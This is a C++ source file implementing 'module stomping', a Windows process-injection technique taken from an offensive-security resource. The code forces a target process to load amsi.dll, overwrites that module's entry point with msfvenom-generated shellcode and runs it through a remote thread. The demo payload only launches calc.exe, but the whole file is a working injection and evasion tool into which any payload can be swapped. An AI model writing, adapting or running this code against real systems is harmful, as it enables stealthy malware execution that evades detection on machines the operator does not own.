/*
Title: Module Stomping
Resources:
	- https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
*/
#include <Windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string>

VOID FreeAll(HANDLE hProcess, LPVOID lpRemoteAddr, HMODULE hKernel32, HANDLE hThread) {
	if (hKernel32)
		CloseHandle(hKernel32);
	if (lpRemoteAddr)
		VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
	if (hThread)
		CloseHandle(hThread);
	if (hProcess)
		CloseHandle(hProcess);
}

BOOL ModuleStomping() {
	DWORD dwPid = 17040; // Replace it with a target PID to be injected.

	WCHAR wModuleToInject[] = L"C:\\Windows\\System32\\amsi.dll";
	CHAR sModuleToInjectName[] = "amsi.dll";

	// Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) return FALSE;

	LPVOID lpRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(wModuleToInject), MEM_COMMIT, PAGE_READWRITE);
	if (!lpRemoteAddr) {
		FreeAll(hProcess, nullptr, nullptr, nullptr);
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, lpRemoteAddr, (LPVOID)wModuleToInject, sizeof(wModuleToInject), nullptr)) {
		FreeAll(hProcess, lpRemoteAddr, nullptr, nullptr);
		return FALSE;
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32");
	if (!hKernel32) {
		FreeAll(hProcess, lpRemoteAddr, nullptr, nullptr);
		return FALSE;
	}
	PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	if (!startRoutine) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, nullptr);
		return FALSE;
	}
	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, startRoutine, lpRemoteAddr, 0, nullptr);
	if (!hThread) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, nullptr);
		return FALSE;
	}
	WaitForSingleObject(hThread, 1000);

	// Find base address of the injected DLL in the remote process.
	HMODULE modules[256] = {};
	SIZE_T dwModulesSize = sizeof(modules);
	DWORD dwModulesSizeNeeded;
	if (!EnumProcessModules(hProcess, modules, dwModulesSize, &dwModulesSizeNeeded)) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}
	SIZE_T dwModulesCnt = dwModulesSizeNeeded / sizeof(HMODULE);
	HMODULE hRemoteModule = nullptr;
	CHAR sRemoteModuleName[MAX_PATH] = {};
	BOOL bFound = FALSE;
	for (size_t i = 0; i < dwModulesCnt; i++) {
		hRemoteModule = modules[i];
		if (GetModuleBaseNameA(hProcess, hRemoteModule, sRemoteModuleName, sizeof(sRemoteModuleName)) > 0) {
			if (std::string(sRemoteModuleName).compare(sModuleToInjectName) == 0) {
				bFound = TRUE;
				break;
			}
		}
	}
	if (!bFound || !hRemoteModule) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}

	// Get the entry point address (RVA) of the target remote module.
	DWORD dwHdrBufSize = 0x1000;
	LPVOID lpRemoteModule = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHdrBufSize);
	if (!lpRemoteModule) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}
	if (!ReadProcessMemory(hProcess, hRemoteModule, lpRemoteModule, dwHdrBufSize, nullptr)) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpRemoteModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpRemoteModule + pDosHeader->e_lfanew);
	LPVOID lpEntryPointRVA = (LPVOID)((DWORD_PTR)hRemoteModule + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	if (!lpEntryPointRVA) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}

	// Write shellcode to the entry point
	SIZE_T dwBytesWritten;
	if (!WriteProcessMemory(hProcess, lpEntryPointRVA, (LPCVOID)shellcode, sizeof(shellcode), &dwBytesWritten)) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}

	// Execute shellcode from inside the target module.
	CreateRemoteThread(hProcess, nullptr, 0, (PTHREAD_START_ROUTINE)lpEntryPointRVA, nullptr, 0, nullptr);
	/*if (!hThread2) {
		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
		return FALSE;
	}*/

	FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);

	return TRUE;
}
